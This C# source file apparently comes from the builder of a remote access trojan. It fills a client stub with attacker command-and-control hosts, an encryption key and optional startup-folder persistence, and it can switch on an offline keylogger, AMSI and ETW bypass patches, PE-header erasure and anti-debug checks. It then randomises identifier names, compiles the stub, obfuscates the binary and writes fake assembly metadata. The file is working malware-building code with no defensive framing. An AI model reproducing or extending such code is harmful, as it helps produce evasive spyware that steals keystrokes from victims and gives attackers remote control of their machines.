﻿using dnlib.DotNet;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO.Compression;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Client_Builder.Builder
{
    internal class StubBuilder
    {
        internal static bool BuildClient()
        {
            
            Program.form1.textBox1.BeginInvoke((MethodInvoker)(() => {
                Program.form1.textBox1.Clear();
                string stub = File.ReadAllText(Application.StartupPath + "\\Stubs\\client.cs");

                string xmlConfig = File.ReadAllText(Application.StartupPath + "\\Stubs\\client.xml");
                string archi = xmlConfig.Replace("anycpu", Program.form1.comboBox1.Text);
                File.WriteAllText(Application.StartupPath + "\\Stubs\\clienttmp.xml", archi);
                //Doing patch
                LogStep("Adding encryption key..." + Environment.NewLine);
                stub = ReplaceStub(stub, "string generalKey = \"123456789\"", $"string generalKey = \"{Program.form1.textBox2.Text}\"");
                LogStep("Adding offline lib..." + Environment.NewLine);
                stub = ReplaceStub(stub, "byte[] offline = new byte[] { };", "byte[] offline = " + LibCompressor(File.ReadAllBytes(Application.StartupPath + "\\Stubs\\Offline.dll")));
                LogStep("Adding packet lib..." + Environment.NewLine);
                stub = ReplaceStub(stub, "byte[] packetLib = new byte[] { };", "byte[] packetLib = " + LibCompressor(File.ReadAllBytes(Application.StartupPath + "\\PacketLib.dll")));

                LogStep("Patching hosts..." + Environment.NewLine);
                string hostsList = null;

                foreach (DataGridViewRow host in Program.form1.dataGridView1.Rows)
                {
                    hostsList += $"\"{host.Cells[0].Value}:{host.Cells[1].Value}\",";
                }

                stub = stub.Replace("\"qsdqsdqsdkjsdljk.com:7521\", \"127.0.0.1:7788\", \"127.0.0.1:9988\", \"127.0.0.1:9875\"", hostsList.Substring(0, hostsList.Length - 1));


                if (Program.form1.checkBox1.Checked && Program.form1.comboBox2.SelectedIndex != -1)
                {
                    LogStep("Adding persistence..." + Environment.NewLine);
                    stub = stub.Replace("Offline.Persistence.Method.NONE", "Offline.Persistence.Method.SHT_STARTUP_FOLDER");
                }
                else
                    LogStep("Skipping persistence..." + Environment.NewLine);

                if (Program.form1.checkBox2.Checked)
                {
                    LogStep("Setting offline keylogger..." + Environment.NewLine);
                    stub = stub.Replace("bool offKeylog = false;", "bool offKeylog = true;");
                }
                else
                    LogStep("Skipping offline keylogger..." + Environment.NewLine);



                if (Program.form1.checkBox3.Checked)
                {
                    LogStep("Setting etw patch..." + Environment.NewLine);
                    stub = stub.Replace("bool blockETW = false;", "bool blockETW = true;");
                }
                else
                    LogStep("Skipping etw patch..." + Environment.NewLine);


                if (Program.form1.checkBox4.Checked)
                {
                    LogStep("Setting amsi patch..." + Environment.NewLine);
                    stub = stub.Replace("bool blockAMSI = false;", "bool blockAMSI = true;");
                }
                else
                    LogStep("Skipping amsi patch..." + Environment.NewLine);


                if (Program.form1.checkBox5.Checked)
                {
                    LogStep("Setting PE headers eraser..." + Environment.NewLine);
                    stub = stub.Replace("bool erasePEFromPEB = false;", "bool erasePEFromPEB = true;");
                }
                else
                    LogStep("Skipping PE headers eraser..." + Environment.NewLine);


                if (Program.form1.checkBox6.Checked)
                {
                    LogStep("Setting anti-debug..." + Environment.NewLine);
                    stub = stub.Replace("bool antiDBG = false;", "bool antiDBG = true;");
                }
                else
                    LogStep("Skipping anti-debug..." + Environment.NewLine);


                stub = Rename(stub, "hosts");
                stub = Rename(stub, "hostLists");
                stub = Rename(stub, "generalKey");
                stub = Rename(stub, "Config");
                stub = Rename(stub, "installationParam");
                stub = Rename(stub, "installationMethod");
                stub = Rename(stub, "StarterClass");
                stub = Rename(stub, "AlreadyLaunched");
                stub = Rename(stub, "OneInstance");
                stub = Rename(stub, "MakeInstall");
                stub = Rename(stub, "StartOfflineKeylogger");
                stub = Rename(stub, "DomCheck");
                stub = Rename(stub, "ConnectStart");
                stub = Rename(stub, "EndLoadPlugin");
                stub = Rename(stub, "LoadPlugin");
                stub = Rename(stub, "SendPacket");
                stub = Rename(stub, "PacketHandler");
                stub = Rename(stub, "ParsePacket");
                stub = Rename(stub, "ReceiveData");
                stub = Rename(stub, "EndDataRead");
                stub = Rename(stub, "PacketParser");
                stub = Rename(stub, "EndPacketRead");
                stub = Rename(stub, "SendDataCompleted");
                stub = Rename(stub, "EndConnect");
                //
                stub = Rename(stub, "ReadDataAsync");
                stub = Rename(stub, "readDataAsync");

                stub = Rename(stub, "ReadPacketAsync");
                stub = Rename(stub, "readPacketAsync");

                stub = Rename(stub, "ConnectAsync");
                stub = Rename(stub, "connectAsync");

                stub = Rename(stub, "SendDataAsync");
                stub = Rename(stub, "sendDataAsync");
                stub = Rename(stub, "SendData");
                //
                stub = Rename(stub, "offKeylog");
                stub = Rename(stub, "antiDBG");
                stub = Rename(stub, "erasePEFromPEB");
                stub = Rename(stub, "blockAMSI");
                stub = Rename(stub, "blockETW");

                File.WriteAllText(Application.StartupPath + "\\Stubs\\clienttmp.cs", stub);

                LogStep("Starting building process..." + Environment.NewLine);
                Build();

                LogStep("Starting obfuscating exe file..." + Environment.NewLine);
                bool built = Obfuscator(Application.StartupPath + "\\Stubs\\Client.exe");
                File.Delete(Application.StartupPath + "\\Stubs\\Client.exe");

                if (built)
                { LogStep("Client built !"); MessageBox.Show("Done !", "", MessageBoxButtons.OK, MessageBoxIcon.Information); }

            }));
            return false;
        }

        private static string ReplaceStub(string stub, string toReplace, string newString)
        {
            return stub.Replace(toReplace, newString);
        }

        private static string Rename(string stub, string toReplace)
        {
            return stub.Replace(toReplace, Misc.RandomString.NextString(10));
        }

        private static void LogStep(string log)
        {
            Program.form1.textBox1.AppendText(log);
        }

        private static void Build()
        {
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            cmd.StartInfo.StandardOutputEncoding = Encoding.GetEncoding(437);
            /*
            The OEM or DOS/OEM character set contains line draw and other symbols commonly used by earlier DOS programs to create charts and simple graphics. 
            Also known as the PC-8 symbol set as well as Code Page 437, 
            the OEM character set is built into every graphics card.
            */
            string xmlPath = Application.StartupPath + "\\Stubs\\clienttmp.xml\"";
            cmd.StartInfo.Arguments = "/c " + "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe \"" + xmlPath;
            cmd.Start();

            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
            Program.form1.textBox1.AppendText(cmd.StandardOutput.ReadToEnd());
            File.Delete(Application.StartupPath + "\\Stubs\\clienttmp.cs");
            File.Delete(Application.StartupPath + "\\Stubs\\clienttmp.xml");
        }

        private static string LibCompressor(byte[] lib)
        {
            using (MemoryStream resultStream = new MemoryStream())
            {
                using (DeflateStream compressionStream = new DeflateStream(resultStream, CompressionMode.Compress))
                {
                    compressionStream.Write(lib, 0, lib.Length);
                }
                byte[] result = resultStream.ToArray();

                return "new byte[] {" + String.Join(",", result) + "};";
            }
        }

        private static bool Obfuscator(string path)
        {
            ModuleDefMD asmDef = ModuleDefMD.Load(path);
            try
            {
                using (asmDef)
                {
                    using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
                    {
                        saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
                        //saveFileDialog1.InitialDirectory = Misc.Utils.GPath;
                        saveFileDialog1.OverwritePrompt = false;
                        saveFileDialog1.FileName = "Client";
                        if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                        {
                            Obfuscate.ObfuscateStub(asmDef);
                            asmDef.Write(saveFileDialog1.FileName);
                            asmDef.Dispose();

                            LogStep("Setting icon..." + Environment.NewLine);

                                LogStep("Skipping setting icon..." + Environment.NewLine);

                            LogStep("Setting assembly information..." + Environment.NewLine);
                            WriteAssemblyInfo.WriteAssemblyInformation(saveFileDialog1.FileName,
                                Program.form1.textBox3.Text,
                                Program.form1.textBox4.Text,
                                Program.form1.textBox5.Text,
                                Program.form1.textBox6.Text,
                                Program.form1.textBox7.Text,
                                Program.form1.textBox8.Text,
                                Program.form1.textBox9.Text,
                                Program.form1.textBox10.Text
                                );

                            return true;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
            return false;
        }
    }
}
